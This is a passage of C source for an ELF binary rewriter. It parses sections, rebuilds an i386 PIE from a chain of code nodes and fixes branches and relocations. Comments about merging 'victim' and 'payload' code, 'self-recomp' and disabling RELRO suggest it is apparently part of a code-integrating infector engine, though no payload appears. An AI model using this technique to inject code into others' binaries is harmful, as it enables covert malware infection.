            write_i32(ei->sec_addr, SI_DYNSTR * 4, sh_addr);
            write_i32(ei->sec_offset, SI_DYNSTR * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_DYNSTR * 4, sh_size);
            write_i32(ei->sec_addralign, SI_DYNSTR * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".dynamic")) {
            write_i32(ei->sec_shidx, SI_DYNAMIC * 4, i);
            write_i32(ei->sec_size, SI_DYNAMIC * 4, sh_size);
            write_i32(ei->sec_addr, SI_DYNAMIC * 4, sh_addr);
            write_i32(ei->sec_offset, SI_DYNAMIC * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_DYNAMIC * 4, sh_size);
            write_i32(ei->sec_addralign, SI_DYNAMIC * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".hash")) {
            write_i32(ei->sec_shidx, SI_HASH * 4, i);
            write_i32(ei->sec_size, SI_HASH * 4, sh_size);
            write_i32(ei->sec_addr, SI_HASH * 4, sh_addr);
            write_i32(ei->sec_offset, SI_HASH * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_HASH * 4, sh_size);
            write_i32(ei->sec_addralign, SI_HASH * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".data")) {
            write_i32(ei->sec_shidx, SI_DATA * 4, i);
            write_i32(ei->sec_size, SI_DATA * 4, sh_size);
            write_i32(ei->sec_addr, SI_DATA * 4, sh_addr);
            write_i32(ei->sec_offset, SI_DATA * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_DATA * 4, sh_size);
            write_i32(ei->sec_addralign, SI_DATA * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".fini_array")) {
            write_i32(ei->sec_shidx, SI_FINI_ARRAY * 4, i);
            write_i32(ei->sec_size, SI_FINI_ARRAY * 4, sh_size);
            write_i32(ei->sec_addr, SI_FINI_ARRAY * 4, sh_addr);
            write_i32(ei->sec_offset, SI_FINI_ARRAY * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_FINI_ARRAY * 4, sh_size);
            write_i32(ei->sec_addralign, SI_FINI_ARRAY * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".rodata")) {
            write_i32(ei->sec_shidx, SI_RODATA * 4, i);
            write_i32(ei->sec_size, SI_RODATA * 4, sh_size);
            write_i32(ei->sec_addr, SI_RODATA * 4, sh_addr);
            write_i32(ei->sec_offset, SI_RODATA * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_RODATA * 4, sh_size);
            write_i32(ei->sec_addralign, SI_RODATA * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".data.rel.ro")) {
            write_i32(ei->sec_shidx, SI_DATARELRO * 4, i);
            write_i32(ei->sec_size, SI_DATARELRO * 4, sh_size);
            write_i32(ei->sec_addr, SI_DATARELRO * 4, sh_addr);
            write_i32(ei->sec_offset, SI_DATARELRO * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_DATARELRO * 4, sh_size);
            write_i32(ei->sec_addralign, SI_DATARELRO * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".bss")) {
            write_i32(ei->sec_shidx, SI_BSS * 4, i);
            write_i32(ei->sec_size, SI_BSS * 4, sh_size);
            write_i32(ei->sec_addr, SI_BSS * 4, sh_addr);
            write_i32(ei->sec_offset, SI_BSS * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_BSS * 4, sh_size);
            write_i32(ei->sec_addralign, SI_BSS * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".interp")) {
            write_i32(ei->sec_shidx, SI_INTERP * 4, i);
            write_i32(ei->sec_size, SI_INTERP * 4, sh_size);
            write_i32(ei->sec_addr, SI_INTERP * 4, sh_addr);
            write_i32(ei->sec_offset, SI_INTERP * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_INTERP * 4, sh_size);
            write_i32(ei->sec_addralign, SI_INTERP * 4, sh_addralign);
        }

        // Fallback: match by sh_type for sections that might have non-standard names
        if (sh_type == SHT_HASH && read_i32(ei->sec_shidx, SI_HASH * 4) < 0) {
            write_i32(ei->sec_shidx, SI_HASH * 4, i);
            write_i32(ei->sec_size, SI_HASH * 4, sh_size);
            write_i32(ei->sec_addr, SI_HASH * 4, sh_addr);
            write_i32(ei->sec_offset, SI_HASH * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_HASH * 4, sh_size);
            write_i32(ei->sec_addralign, SI_HASH * 4, sh_addralign);
        }
        if (sh_type == SHT_DYNSYM && read_i32(ei->sec_shidx, SI_DYNSYM * 4) < 0) {
            write_i32(ei->sec_shidx, SI_DYNSYM * 4, i);
            write_i32(ei->sec_size, SI_DYNSYM * 4, sh_size);
            write_i32(ei->sec_addr, SI_DYNSYM * 4, sh_addr);
            write_i32(ei->sec_offset, SI_DYNSYM * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_DYNSYM * 4, sh_size);
            write_i32(ei->sec_addralign, SI_DYNSYM * 4, sh_addralign);
        }
        if (sh_type == SHT_DYNAMIC && read_i32(ei->sec_shidx, SI_DYNAMIC * 4) < 0) {
            write_i32(ei->sec_shidx, SI_DYNAMIC * 4, i);
            write_i32(ei->sec_size, SI_DYNAMIC * 4, sh_size);
            write_i32(ei->sec_addr, SI_DYNAMIC * 4, sh_addr);
            write_i32(ei->sec_offset, SI_DYNAMIC * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_DYNAMIC * 4, sh_size);
            write_i32(ei->sec_addralign, SI_DYNAMIC * 4, sh_addralign);
        }
        if (sh_type == SHT_GNU_VERSYM && read_i32(ei->sec_shidx, SI_GNUVERSION * 4) < 0) {
            write_i32(ei->sec_shidx, SI_GNUVERSION * 4, i);
            write_i32(ei->sec_size, SI_GNUVERSION * 4, sh_size);
            write_i32(ei->sec_addr, SI_GNUVERSION * 4, sh_addr);
            write_i32(ei->sec_offset, SI_GNUVERSION * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_GNUVERSION * 4, sh_size);
            write_i32(ei->sec_addralign, SI_GNUVERSION * 4, sh_addralign);
        }
        if (sh_type == SHT_GNU_VERNEED && read_i32(ei->sec_shidx, SI_GNUVERSIONR * 4) < 0) {
            write_i32(ei->sec_shidx, SI_GNUVERSIONR * 4, i);
            write_i32(ei->sec_size, SI_GNUVERSIONR * 4, sh_size);
            write_i32(ei->sec_addr, SI_GNUVERSIONR * 4, sh_addr);
            write_i32(ei->sec_offset, SI_GNUVERSIONR * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_GNUVERSIONR * 4, sh_size);
            write_i32(ei->sec_addralign, SI_GNUVERSIONR * 4, sh_addralign);
        }

        // .ctors — may also be .init_array (SHT_INIT_ARRAY)
        if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".ctors") ||
            sec_name_eq(ei->data, shstrtab_off, sh_name, ".init_array") ||
            sh_type == SHT_INIT_ARRAY) {
            if (read_i32(ei->sec_shidx, SI_CTOR * 4) < 0) {
                write_i32(ei->sec_shidx, SI_CTOR * 4, i);
                write_i32(ei->sec_size, SI_CTOR * 4, sh_size);
                write_i32(ei->sec_addr, SI_CTOR * 4, sh_addr);
                write_i32(ei->sec_offset, SI_CTOR * 4, sh_offset);
                write_i32(ei->sec_orig_size, SI_CTOR * 4, sh_size);
                write_i32(ei->sec_addralign, SI_CTOR * 4, sh_addralign);
            }
        }

        i = i + 1;
    }

    // Load section data into sec_data[] for sections we'll modify
    i = 0;
    while (i < SI_COUNT) {
        if (read_i32(ei->sec_shidx, i * 4) >= 0) {
            sh_size = read_i32(ei->sec_size, i * 4);
            sh_offset = read_i32(ei->sec_offset, i * 4);
            if (sh_size > 0 && sh_offset > 0 && sh_offset + sh_size <= ei->size) {
                // Allocate extra space for potential growth
                // PLT/GOT/symbol sections may grow by ~20 entries (~320 bytes)
                // .data may grow by payload data + bundle (~400KB for self-recomp)
                write_i32(ei->sec_data, i * 4, malloc(sh_size + 524288));
                mem_copy(read_i32(ei->sec_data, i * 4), ei->data + sh_offset, sh_size);
            }
        }
        i = i + 1;
    }

    // Validate required sections
    if (ei->text_shidx < 0) {
        print("ERR: .text section not found\n");
        return 0;
    }
    if (read_i32(ei->sec_shidx, SI_RELDYN * 4) < 0) {
        print("ERR: .rel.dyn section not found\n");
        return 0;
    }
    if (read_i32(ei->sec_shidx, SI_DYNSYM * 4) < 0) {
        print("ERR: .dynsym section not found\n");
        return 0;
    }
    if (read_i32(ei->sec_shidx, SI_DYNSTR * 4) < 0) {
        print("ERR: .dynstr section not found\n");
        return 0;
    }
    if (read_i32(ei->sec_shidx, SI_DYNAMIC * 4) < 0) {
        print("ERR: .dynamic section not found\n");
        return 0;
    }

    // Save original addresses (before build_elf changes sec_addr)
    i = 0;
    while (i < SI_COUNT) {
        write_i32(ei->sec_orig_addr, i * 4, read_i32(ei->sec_addr, i * 4));
        i = i + 1;
    }

    return 1;
}

// Build a reloc map for .text from .rel.dyn R_386_RELATIVE entries.
// Returns a byte array of text_size where reloc_map[off] = 1 if a 4-byte
// absolute address begins at that offset.
char* build_reloc_map(struct ElfInfo* ei) {
    char* reloc_map;
    char* reldyn_data;
    int reldyn_size;
    int num_entries;
    int i;
    int r_offset;
    int r_info;
    int r_type;
    int text_off;

    reloc_map = malloc(ei->text_size);
    mem_set(reloc_map, 0, ei->text_size);

    reldyn_data = read_i32(ei->sec_data, SI_RELDYN * 4);
    reldyn_size = read_i32(ei->sec_size, SI_RELDYN * 4);
    if (reldyn_data == 0 || reldyn_size == 0) { return reloc_map; }

    num_entries = reldyn_size / ELF_REL_SZ;
    i = 0;
    while (i < num_entries) {
        r_offset = read_i32(reldyn_data, i * ELF_REL_SZ + R_OFFSET_OFF);
        r_info = read_i32(reldyn_data, i * ELF_REL_SZ + R_INFO_OFF);
        r_type = elf_r_type(r_info);

        if (r_type == R_386_RELATIVE) {
            // r_offset is VA; convert to .text-relative offset
            if (r_offset >= ei->text_addr && r_offset < ei->text_addr + ei->text_size) {
                text_off = r_offset - ei->text_addr;
                if (text_off >= 0 && text_off < ei->text_size) {
                    reloc_map[text_off] = 1;
                }
            }
        }
        i = i + 1;
    }

    return reloc_map;
}


// Print ELF section discovery summary
void print_elf_info(struct ElfInfo* ei) {
    print("ELF PIE (ET_DYN, EM_386)\n");
    print("  entry=");
    print_int(ei->e_entry);
    print(" prelink=");
    print_int(ei->prelink);
    print(" shnum=");
    print_int(ei->e_shnum);
    print(" phnum=");
    print_int(ei->e_phnum);
    print("\n");
    print("  .text: addr=");
    print_int(ei->text_addr);
    print(" off=");
    print_int(ei->text_off);
    print(" size=");
    print_int(ei->text_size);
    print("\n");

    if (read_i32(ei->sec_shidx, SI_PLT * 4) >= 0) {
        print("  .plt: addr=");
        print_int(read_i32(ei->sec_addr, SI_PLT * 4));
        print(" size=");
        print_int(read_i32(ei->sec_size, SI_PLT * 4));
        print("\n");
    }
    if (read_i32(ei->sec_shidx, SI_GOTPLT * 4) >= 0) {
        print("  .got.plt: addr=");
        print_int(read_i32(ei->sec_addr, SI_GOTPLT * 4));
        print(" size=");
        print_int(read_i32(ei->sec_size, SI_GOTPLT * 4));
        print("\n");
    }
    if (read_i32(ei->sec_shidx, SI_RELDYN * 4) >= 0) {
        print("  .rel.dyn: ");
        print_int(read_i32(ei->sec_size, SI_RELDYN * 4) / 8);
        print(" entries\n");
    }
    if (read_i32(ei->sec_shidx, SI_RELPLT * 4) >= 0) {
        print("  .rel.plt: ");
        print_int(read_i32(ei->sec_size, SI_RELPLT * 4) / 8);
        print(" entries\n");
    }
    if (read_i32(ei->sec_shidx, SI_DYNSYM * 4) >= 0) {
        print("  .dynsym: ");
        print_int(read_i32(ei->sec_size, SI_DYNSYM * 4) / 16);
        print(" symbols\n");
    }
    if (read_i32(ei->sec_shidx, SI_CTOR * 4) >= 0) {
        print("  .ctors/.init_array: size=");
        print_int(read_i32(ei->sec_size, SI_CTOR * 4));
        print("\n");
    }
}

// =============================================================================
//
// ELF Reassembly Module
//
// build_elf — emits the new ELF from the mixed CodeNode chain. Branches
// and relocations are patched by the Fixup module.
//
// =============================================================================

// Build output ELF. Iterate PT_LOAD segments in order. For each segment,
// write its sections (from sec_data[] if modified, original if not).
// .text emitted from CodeNode chain. Section header table at end.
// Tracks new file offsets for all sections; computes per-segment file/mem sizes.
// Does NOT fix branches or relocations — that's done by the fixup pass below.
char* build_elf(struct ElfInfo* ei, struct CodeNode* head, int* out_size) {
    int new_text_size;
    int total_out;
    char* out;
    struct CodeNode* c;
    int i;
    int j;
    int k;
    int si;
    int found_si;
    int write_pos;
    int new_shoff;
    int ph_off;
    int p_type;
    int p_offset;
    int p_vaddr;
    int p_filesz;
    int p_memsz;
    int p_align;
    int sh_off;
    int sh_offset;
    int sh_size;
    int sh_addr;
    int sh_type;
    int sh_align;
    int sh_flags;
    int sec_cur_sz;
    int seg_file_start;
    int seg_va_start;
    // Per-section new offset/addr tracking (indexed by section header index)
    int* new_sec_off;   // new file offset for each section
    int* new_sec_addr;  // new VA for each section
    int* new_sec_size;  // new size for each section

    new_text_size = assign_offsets(head, ei->text_addr);

    // Allocate per-section tracking
    new_sec_off = malloc(ei->e_shnum * 4);
    new_sec_addr = malloc(ei->e_shnum * 4);
    new_sec_size = malloc(ei->e_shnum * 4);
    i = 0;
    while (i < ei->e_shnum) {
        // Default: same as original
        new_sec_off[i] = read_i32(ei->data, ei->e_shoff + i * ELF_SHDR_SZ + SH_OFFSET_OFF);
        new_sec_addr[i] = read_i32(ei->data, ei->e_shoff + i * ELF_SHDR_SZ + SH_ADDR_OFF);
        new_sec_size[i] = read_i32(ei->data, ei->e_shoff + i * ELF_SHDR_SZ + SH_SIZE_OFF);
        // Override size for tracked sections that were extended
        si = 0;
        while (si < SI_COUNT) {
            if (read_i32(ei->sec_shidx, si * 4) == i) {
                new_sec_size[i] = read_i32(ei->sec_size, si * 4);
                si = SI_COUNT;
            }
            si = si + 1;
        }
        i = i + 1;
    }
    // .text size override
    new_sec_size[ei->text_shidx] = new_text_size;

    // Generous output allocation
    total_out = ei->size * 2 + new_text_size + 1048576;
    out = malloc(total_out);
    mem_set(out, 0, total_out);

    // Copy ELF header + program headers only (NOT full pre-.text — sections may overlap)
    mem_copy(out, ei->data, ELF_EHDR_SZ + ei->e_phnum * ELF_PHDR_SZ);

    // Process ALL PT_LOAD segments, including LOAD 0
    write_pos = ELF_EHDR_SZ + ei->e_phnum * ELF_PHDR_SZ;

    i = 0;
    while (i < ei->e_phnum) {
        ph_off = ei->e_phoff + i * ELF_PHDR_SZ;
        p_type = read_i32(ei->data, ph_off + P_TYPE_OFF);
        if (p_type != PT_LOAD) {
            i = i + 1;
            continue;
        }

        p_offset = read_i32(ei->data, ph_off + P_OFFSET_OFF);
        p_vaddr = read_i32(ei->data, ph_off + P_VADDR_OFF);
        p_filesz = read_i32(ei->data, ph_off + P_FILESZ_OFF);
        p_memsz = read_i32(ei->data, ph_off + P_MEMSZ_OFF);
        p_align = read_i32(ei->data, ph_off + P_ALIGN_OFF);

        // First LOAD (offset 0): must start at file offset 0 to cover EHDR+PHDR
        if (p_offset == 0) {
            // ELF header and phdrs already written at offset 0
            // Sections start after them
            write_pos = ELF_EHDR_SZ + ei->e_phnum * ELF_PHDR_SZ;
            seg_file_start = 0;  // LOAD 0 starts at file offset 0
        }
        // Other LOADs: page-align with ELF alignment invariant
        if (p_offset != 0 && p_align > 1 && write_pos > 0) {
            write_pos = align_up(write_pos, p_align);
            write_pos = write_pos + (p_vaddr % p_align);
        }

        // For the text segment, use the original file offset to keep pre-.text
        // sections (.init, .plt) at their original VAs
        if (write_pos < p_offset) {
            write_pos = p_offset;
        }
        if (p_offset == 0) {
            seg_file_start = 0;
            seg_va_start = 0;
        } else {
            seg_file_start = write_pos;
            // Compute new VA from file position, maintaining alignment invariant
            // p_vaddr % p_align == p_offset % p_align
            // new_va = write_pos (file aligned to page already)
            seg_va_start = write_pos;
            if (p_align > 0 && p_align > 1) {
                // Maintain original VA-to-offset relationship within page
                seg_va_start = write_pos + (p_vaddr % p_align) - (write_pos % p_align);
                if (seg_va_start < write_pos) {
                    seg_va_start = seg_va_start + p_align;
                }
            }
        }

        // Find and write all sections belonging to this segment (by original VA range)
        j = 0;
        while (j < ei->e_shnum) {
            sh_addr = read_i32(ei->data, ei->e_shoff + j * ELF_SHDR_SZ + SH_ADDR_OFF);
            sh_offset = read_i32(ei->data, ei->e_shoff + j * ELF_SHDR_SZ + SH_OFFSET_OFF);
            sh_size = read_i32(ei->data, ei->e_shoff + j * ELF_SHDR_SZ + SH_SIZE_OFF);
            sh_type = read_i32(ei->data, ei->e_shoff + j * ELF_SHDR_SZ + SH_TYPE_OFF);
            sh_align = read_i32(ei->data, ei->e_shoff + j * ELF_SHDR_SZ + SH_ADDRALIGN_OFF);
            sh_flags = read_i32(ei->data, ei->e_shoff + j * ELF_SHDR_SZ + SH_FLAGS_OFF);

            // Check if this section belongs to this segment
            if (sh_addr == 0 || sh_type == SHT_NULL ||
                sh_addr < p_vaddr || sh_addr >= p_vaddr + p_memsz) {
                j = j + 1;
                continue;
            }

            // Preserve original position within segment (avoid compressing gaps)
            // Sections maintain their original offset from segment start.
            {
                int orig_seg_offset;
                orig_seg_offset = sh_addr - p_vaddr;
                if (seg_file_start + orig_seg_offset > write_pos) {
                    write_pos = seg_file_start + orig_seg_offset;
                } else if (sh_align > 1) {
                    write_pos = align_up(write_pos, sh_align);
                }
            }

            new_sec_addr[j] = seg_va_start + (write_pos - seg_file_start);
            new_sec_off[j] = write_pos;

            if (sh_type == SHT_NOBITS) {
                // .bss: no file content, just track address
                j = j + 1;
                continue;
            }

            // Write section content
            if (j == ei->text_shidx) {
                // .text from chain
                c = head;
                while (c != 0) {
                    if (c->src != 0 && c->len > 0) {
                        mem_copy(out + write_pos + c->newofs, c->src, c->len);
                    }
                    c = c->next;
                }
                write_pos = write_pos + new_text_size;
            } else {
                // Check if tracked in sec_data[]
                found_si = -1;
                si = 0;
                while (si < SI_COUNT) {
                    if (read_i32(ei->sec_shidx, si * 4) == j) { found_si = si; si = SI_COUNT; }
                    si = si + 1;
                }
                sec_cur_sz = new_sec_size[j];
                if (found_si >= 0 && read_i32(ei->sec_data, found_si * 4) != 0) {
                    mem_copy(out + write_pos, read_i32(ei->sec_data, found_si * 4), sec_cur_sz);
                    write_i32(ei->sec_offset, found_si * 4, write_pos);
                } else if (sh_size > 0) {
                    mem_copy(out + write_pos, ei->data + sh_offset, sh_size);
                    sec_cur_sz = sh_size;
                }
                write_pos = write_pos + sec_cur_sz;
            }

            j = j + 1;
        }

        // Update this PT_LOAD's file/mem sizes
        write_i32(out, ph_off + P_OFFSET_OFF, seg_file_start);
        write_i32(out, ph_off + P_VADDR_OFF, seg_va_start);
        write_i32(out, ph_off + P_PADDR_OFF, seg_va_start);
        write_i32(out, ph_off + P_FILESZ_OFF, write_pos - seg_file_start);
        // MemSiz = FileSiz + original BSS gap (MemSiz > FileSiz for .bss segment)
        {
            int orig_filesz;
            int orig_memsz;
            int bss_extra;
            orig_filesz = read_i32(ei->data, ph_off + P_FILESZ_OFF);
            orig_memsz = read_i32(ei->data, ph_off + P_MEMSZ_OFF);
            bss_extra = orig_memsz - orig_filesz;
            if (bss_extra < 0) { bss_extra = 0; }
            write_i32(out, ph_off + P_MEMSZ_OFF, write_pos - seg_file_start + bss_extra);
        }

        // OPTION A: Pad write_pos so its page remainder matches the original segment end.
        // This preserves inter-segment alignment gaps, ensuring GOT-relative offsets
        // between different LOAD segments remain valid after .text growth.
        {
            int orig_end;
            int orig_remainder;
            int cur_remainder;
            int pad;
            orig_end = p_offset + p_filesz;
            if (p_align > 1 && p_offset != 0) {
                orig_remainder = orig_end % p_align;
                cur_remainder = write_pos % p_align;
                if (cur_remainder != orig_remainder) {
                    pad = (orig_remainder - cur_remainder + p_align) % p_align;
                    write_pos = write_pos + pad;
                }
            }
        }

        i = i + 1;
    }

    // Write non-loadable sections (.comment, .symtab, .strtab, .shstrtab)
    j = 0;
    while (j < ei->e_shnum) {
        sh_addr = read_i32(ei->data, ei->e_shoff + j * ELF_SHDR_SZ + SH_ADDR_OFF);
        sh_offset = read_i32(ei->data, ei->e_shoff + j * ELF_SHDR_SZ + SH_OFFSET_OFF);
        sh_size = read_i32(ei->data, ei->e_shoff + j * ELF_SHDR_SZ + SH_SIZE_OFF);
        sh_type = read_i32(ei->data, ei->e_shoff + j * ELF_SHDR_SZ + SH_TYPE_OFF);
        sh_align = read_i32(ei->data, ei->e_shoff + j * ELF_SHDR_SZ + SH_ADDRALIGN_OFF);
        if (sh_addr == 0 && sh_offset > 0 && sh_size > 0 && sh_type != SHT_NULL) {
            if (sh_align > 1) { write_pos = align_up(write_pos, sh_align); }
            mem_copy(out + write_pos, ei->data + sh_offset, sh_size);
            new_sec_off[j] = write_pos;
            new_sec_size[j] = sh_size;
            write_pos = write_pos + sh_size;
        }
        j = j + 1;
    }

    // Section header table
    new_shoff = align_up(write_pos, 4);
    mem_copy(out + new_shoff, ei->data + ei->e_shoff, ei->e_shnum * ELF_SHDR_SZ);
    write_i32(out, E_SHOFF_OFF, new_shoff);

    // Fix all section headers with new offsets/addrs/sizes
    i = 0;
    while (i < ei->e_shnum) {
        sh_off = new_shoff + i * ELF_SHDR_SZ;
        write_i32(out, sh_off + SH_OFFSET_OFF, new_sec_off[i]);
        write_i32(out, sh_off + SH_ADDR_OFF, new_sec_addr[i]);
        write_i32(out, sh_off + SH_SIZE_OFF, new_sec_size[i]);
        i = i + 1;
    }
    total_out = new_shoff + ei->e_shnum * ELF_SHDR_SZ;

    // Disable GNU_RELRO (prevents mprotect of .got to readonly, avoids SEGV_ACCERR)
    i = 0;
    while (i < ei->e_phnum) {
        ph_off = ei->e_phoff + i * ELF_PHDR_SZ;
        p_type = read_i32(out, ph_off + P_TYPE_OFF);
        if (p_type == PT_GNU_RELRO) {
            write_i32(out, ph_off + P_TYPE_OFF, PT_NULL);
        }
        i = i + 1;
    }

    // Fix non-PT_LOAD program headers (PT_DYNAMIC, PT_INTERP, etc.)
    // Match each to its section by original file offset and update
    i = 0;
    while (i < ei->e_phnum) {
        ph_off = ei->e_phoff + i * ELF_PHDR_SZ;
        p_type = read_i32(ei->data, ph_off + P_TYPE_OFF);
        if (p_type != PT_LOAD && p_type != PT_PHDR && p_type != 0) {
            p_offset = read_i32(ei->data, ph_off + P_OFFSET_OFF);
            p_vaddr = read_i32(ei->data, ph_off + P_VADDR_OFF);
            p_filesz = read_i32(ei->data, ph_off + P_FILESZ_OFF);
            // Find section with matching original offset
            j = 0;
            while (j < ei->e_shnum) {
                sh_offset = read_i32(ei->data, ei->e_shoff + j * ELF_SHDR_SZ + SH_OFFSET_OFF);
                if (sh_offset == p_offset && sh_offset > 0) {
                    write_i32(out, ph_off + P_OFFSET_OFF, new_sec_off[j]);
                    write_i32(out, ph_off + P_VADDR_OFF, new_sec_addr[j]);
                    write_i32(out, ph_off + P_PADDR_OFF, new_sec_addr[j]);
                    write_i32(out, ph_off + P_FILESZ_OFF, new_sec_size[j]);
                    write_i32(out, ph_off + P_MEMSZ_OFF, new_sec_size[j]);
                    j = ei->e_shnum; // break
                }
                j = j + 1;
            }
        }
        i = i + 1;
    }

    // Store new section offsets in ei->sec_offset for fixup functions
    si = 0;
    while (si < SI_COUNT) {
        k = read_i32(ei->sec_shidx, si * 4);
        if (k >= 0) {
            write_i32(ei->sec_offset, si * 4, new_sec_off[k]);
            write_i32(ei->sec_addr, si * 4, new_sec_addr[k]);
        }
        si = si + 1;
    }

    // Rebase CodeNode VAs: assign_offsets used ei->text_addr (original) as base,
    // but .text may now be at a different VA after section growth shifted it.
    // Recompute newrva for all nodes using the actual new .text VA.
    {
        int actual_text_va;
        int va_shift;
        actual_text_va = read_i32(ei->sec_addr, SI_TEXT * 4);
        va_shift = actual_text_va - ei->text_addr;
        if (va_shift != 0) {
            c = head;
            while (c != 0) {
                c->newrva = c->newrva + va_shift;
                c = c->next;
            }
            print("  VA rebase: .text shifted by ");
            print_int(va_shift);
            print("\n");
        }
    }

    // Fix e_entry: find the CodeNode at the original entry point and update
    // (must be AFTER VA rebase so newrva reflects final addresses)
    {
        struct CodeNode* ec;
        ec = head;
        while (ec != 0) {
            if (ec->oldrva == ei->e_entry) {
                write_i32(out, E_ENTRY_OFF, ec->newrva);
                break;
            }
            ec = ec->next;
        }
    }

    free(new_sec_off);
    free(new_sec_addr);
    free(new_sec_size);

    print("  Output ELF: .text=");
    print_int(new_text_size);
    print(" total=");
    print_int(total_out);
    print("\n");

    *out_size = total_out;
    return out;
}

// =============================================================================
//
// Reloc & Fixup Module
//
// remap_va + the 14 fixup passes that patch branches, GOT/PLT, init/fini,
// dynsym, scatter call/faddr fixups, etc.
//
// =============================================================================

// Map old VA to new VA using ElfInfo section tracking.
// For addresses in .text, looks up in the CodeNode chain.
// For addresses in other sections, computes from the section's VA shift.
int remap_va(struct ElfInfo* ei, struct CodeNode* head, int old_va) {
    int si;
    int old_addr;
    int new_addr;
    int old_size;
    struct CodeNode* t;

    // Check if in .text
    if (old_va >= ei->text_addr && old_va < ei->text_addr + ei->text_size) {
        // Exact match or FL_SEEN range (trusted)
        t = find_node_strict(head, old_va);
        if (t != 0) { return t->newrva + (old_va - t->oldrva); }
        // Gap range match fallback
        t = find_node_by_oldrva(head, old_va);
        if (t != 0) { return t->newrva + (old_va - t->oldrva); }
        // No match — uniform .text VA shift
        new_addr = read_i32(ei->sec_addr, SI_TEXT * 4);
        return new_addr + (old_va - ei->text_addr);
    }

    // Check tracked sections by ORIGINAL address
    si = 0;
    while (si < SI_COUNT) {
        if (read_i32(ei->sec_shidx, si * 4) >= 0) {
            old_addr = read_i32(ei->sec_orig_addr, si * 4);
            old_size = read_i32(ei->sec_orig_size, si * 4);
            if (old_size == 0) {
                old_size = read_i32(ei->sec_size, si * 4);
            }
            if (old_addr > 0 && old_va >= old_addr && old_va < old_addr + old_size) {
                new_addr = read_i32(ei->sec_addr, si * 4);
                return new_addr + (old_va - old_addr);
            }
        }
        si = si + 1;
    }

    // Fallback: for addresses in the range after .text (data segments),
    // apply a uniform shift based on the data segment's VA change.
    // This handles untracked sections like .fini_array, .bss, etc.
    {
        int data_orig;
        int data_new;
        int data_shift;
        data_orig = read_i32(ei->sec_orig_addr, SI_DATA * 4);
        data_new = read_i32(ei->sec_addr, SI_DATA * 4);
        if (data_orig > 0 && data_new > 0) {
            data_shift = data_new - data_orig;
            // Apply to any address in the data segment range
            if (old_va >= data_orig - 4096 && old_va < data_orig + 65536) {
                return old_va + data_shift;
            }
        }
    }

    return old_va; // truly unknown, return as-is
}

// Fix branch displacements in the output buffer.
// For each linked branch node (both victim and payload), compute new
// displacement from assigned addresses and write into the output.
void fix_branches(char* out, int text_file_off, struct CodeNode* head) {
    struct CodeNode* c;
    int disp;
    int disp_off;
    int disp_sz;

    c = head;
    while (c != 0) {
        if ((c->flags & FL_BRANCH) != 0) {
            if (c->link != 0) {
                // Linked branch: target is another CodeNode
                disp_sz = get_branch_disp_size(c->src);
                disp = c->link->newrva - (c->newrva + c->len);

                if (disp_sz == 4) {
                    disp_off = text_file_off + c->newofs + c->len - 4;
                    write_i32(out, disp_off, disp);
                } else if (disp_sz == 1) {
                    disp_off = text_file_off + c->newofs + c->len - 1;
                    out[disp_off] = disp & 0xFF;
                }
            } else if (c->target_rva >= 0 && (c->flags & FL_ME) == 0) {
                // Unlinked victim branch: remap target if in .text (may have moved)
                disp_sz = get_branch_disp_size(c->src);
                if (disp_sz == 4) {
                    int target;
                    struct CodeNode* tgt_node;
                    target = c->target_rva;
                    // Try to find the target node (may have been linked during resolve)
                    tgt_node = find_node_by_oldrva(head, target);
                    if (tgt_node != 0) {
                        target = tgt_node->newrva + (c->target_rva - tgt_node->oldrva);
                    }
                    disp = target - (c->newrva + c->len);
                    disp_off = text_file_off + c->newofs + c->len - 4;
                    write_i32(out, disp_off, disp);
                }
            }
        }
        c = c->next;
    }
}

// Fix .rel.dyn R_386_RELATIVE entries whose r_offset points into .text.
// These entries contain absolute VAs that need remapping after code scattering.
void fix_rel_dyn(char* out, struct ElfInfo* ei, struct CodeNode* head, int total_out) {
    char* reldyn_data;
    int reldyn_size;
    int reldyn_file_off;
    int num_entries;
    int i;
    int si;
    int r_offset;
    int r_info;
    int r_type;
    int old_addr;
    int sec_file_off;
    int sec_sz;
    int old_val;
    int new_val;
    int out_reldyn_off;

    reldyn_size = read_i32(ei->sec_size, SI_RELDYN * 4);
    reldyn_file_off = read_i32(ei->sec_offset, SI_RELDYN * 4);
    // sec_offset already updated by build_elf — no delta needed
    reldyn_data = read_i32(ei->sec_data, SI_RELDYN * 4);
    if (reldyn_data == 0 || reldyn_size == 0) { return; }

    num_entries = reldyn_size / ELF_REL_SZ;
    i = 0;
    while (i < num_entries) {
        r_offset = read_i32(reldyn_data, i * ELF_REL_SZ + R_OFFSET_OFF);
        r_info = read_i32(reldyn_data, i * ELF_REL_SZ + R_INFO_OFF);
        r_type = elf_r_type(r_info);

        out_reldyn_off = reldyn_file_off + i * ELF_REL_SZ;

        if (r_type == R_386_RELATIVE) {
            // 1) Remap r_offset (the location to patch) to new VA
            new_val = remap_va(ei, head, r_offset);
            write_i32(out, out_reldyn_off + R_OFFSET_OFF, new_val);

            // Value remapping done by fix_relative_values (avoid double-remap)
        } else if (r_type == R_386_GLOB_DAT) {
            new_val = remap_va(ei, head, r_offset);
            write_i32(out, out_reldyn_off + R_OFFSET_OFF, new_val);
        }

        i = i + 1;
    }
}

